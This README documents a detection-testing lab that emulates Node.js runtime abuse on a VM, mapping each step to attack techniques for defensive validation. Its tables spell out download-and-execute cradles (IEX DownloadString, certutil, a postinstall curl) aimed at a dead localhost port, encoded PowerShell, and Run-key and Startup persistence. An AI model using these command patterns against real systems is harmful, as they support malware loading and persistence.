# Emulation: Node.js Runtime Abuse

Three harmless, behaviour-only emulations for the lab VM. Together they test every detection three ways: does it fire on the main attack, does it survive the variants, and does it stay silent on normal developer use.

| Script | Capture id | Variants | Tests that it… | Time |
|---|---|---|---|---|
| [`mtdf_node_lab.ps1`](mtdf_node_lab.ps1) | `node_lab_v1` | V0 | fire on the main loader → children → C2 chain | ~9 min |
| [`mtdf_node_variants.ps1`](mtdf_node_variants.ps1) | `node_variants_v1` | V1–V6 | catch renamed runtimes, non-web C2, persistence, staging, npm postinstall, Electron | ~3 min |
| [`mtdf_node_benign.ps1`](mtdf_node_benign.ps1) | `node_benign_v1` | B | stay **silent** on npm install, npm run, npx, node -e, a browser open, a git clone and an app talking to the registry | ~2 min |

Each writes its capture next to itself and ends with a check that every variant actually ran and was logged.

## Needs

- The lab VM set up per [`lab/README.md`](../../../lab/README.md) (Sysmon with the lab config).
- Node.js LTS on the VM: <https://nodejs.org>. Open a **new** PowerShell afterwards so `node` is on the PATH.
- Internet access from the VM (for the public Ethereum RPC calls).

## Run

Copy `mtdf_node_lab.ps1` to the VM, then in PowerShell in that folder:

```powershell
powershell -ExecutionPolicy Bypass -File mtdf_node_lab.ps1
```

It takes about 9 minutes and writes `node_lab_capture.json` next to the script. At the end it reports how many events came from the lab node runtime; if it warns about fewer than 20 network events, Sysmon is not logging node's connections, so fix the config and run it again.

## What it does, mapped to the attack-surface matrix

| Step | What runs | Matrix row it exercises | Why it is safe |
|---|---|---|---|
| Loader | A copy of `node.exe` runs `update.js` from `%TEMP%\mtdf-node`, launched by PowerShell | Loader execution | The runtime is your own installed node, copied; the script is the one below |
| Child 1 | `whoami` | Code execution in node (benign baseline) | Read-only |
| Child 2 | PowerShell `IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/test.ps1')` | Shell / LOLBin / encoded PowerShell from node | Nothing listens on 127.0.0.1:9, so nothing downloads |
| Child 3 | `powershell -e dwBoAG8AYQBtAGkA` | same | Decodes to `whoami` |
| Child 4 | `certutil -urlcache -f http://127.0.0.1:9/a.txt ...` | same | Same dead local port |
| C2 | 25 × `eth_blockNumber` to `ethereum-rpc.publicnode.com`, ~20 s apart, 25% jitter, new connection each time | Command and control (blockchain-resolved, polling) | A public, read-only request for the latest block number |

## Variants and benign steps (mtdf_node_variants.ps1, mtdf_node_benign.ps1)

| Id | What runs | Why it is safe |
|---|---|---|
| V1 | node.exe copied to `Downloads\mtdf-variant\update.exe` runs `payload.js`; child: `powershell -e` decoding to `whoami` | Your own node, renamed; read-only command |
| V2 | 6 TCP connections to `portquiz.net:4444` (a public service that accepts any port) | Connect and close; nothing sent |
| V3 | HKCU Run value `MTDFUpdater` → `update.exe payload.js` | Removed by the script before it ends |
| V4 | `mtdf_test.cmd` in the Startup folder, `mtdf-variant-stage.ps1` in %TEMP% | Contents are `exit /b 0` and `Write-Output`; both removed |
| V5 | `npm install` of a local package whose postinstall runs `curl http://127.0.0.1:9/stage.sh` | Nothing listens on 127.0.0.1:9 |
| V6 | node.exe copied as `%TEMP%\mtdf-electron\Code.exe` runs `main.js` (`whoami`) | A stand-in for a real Electron app: same name, same launch shape |
| B | npm install `ms`, app fetches its metadata from registry.npmjs.org, `npm run build` (`node -e`), `npx cowsay`, `node -e`, `npx open-cli http://localhost:3000` (browser open, as `npm start --open` does), `npm run fetch` (`git clone` from github.com) | Normal developer activity; the browser opens a dead localhost tab |

## Register the captures

On your main machine, from the repo root (one line each):

```powershell
python tools\add_capture.py --threat nodejs-runtime-abuse --capture <path>\node_lab_capture.json --id node_lab_v1 --title "Node.js lab emulation: loader, child processes, blockchain-RPC polling" --emulation emulation/mtdf_node_lab.ps1
python tools\add_capture.py --threat nodejs-runtime-abuse --capture <path>\node_variants_capture.json --id node_variants_v1 --title "Node.js variants V1-V6" --emulation emulation/mtdf_node_variants.ps1
python tools\add_capture.py --threat nodejs-runtime-abuse --capture <path>\node_benign_capture.json --id node_benign_v1 --title "Benign developer workflow" --emulation emulation/mtdf_node_benign.ps1
```

Each stores the capture in `telemetry/`, records its metadata, and builds the tests for every detection that names that capture id.
